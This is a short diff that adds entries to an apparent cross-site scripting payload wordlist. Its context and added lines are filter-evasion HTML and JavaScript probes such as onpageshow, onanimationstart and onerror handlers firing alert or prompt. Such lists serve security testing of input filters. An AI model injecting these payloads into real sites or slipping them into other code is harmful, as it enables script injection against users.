@@ -1184,3 +1184,6 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <object onbeforescriptexecute="alert(1)"/><script>+</script>
 ＜℅ncut=ﬁnd()＞x
 '"><img src=x onerror=prompt(0);"onfocus=prompt(3); "
+<body/onpageshow=alert(1)>
+<div style=animation-name:x onanimationstart=alert(1)>
+<a href= /whatever>
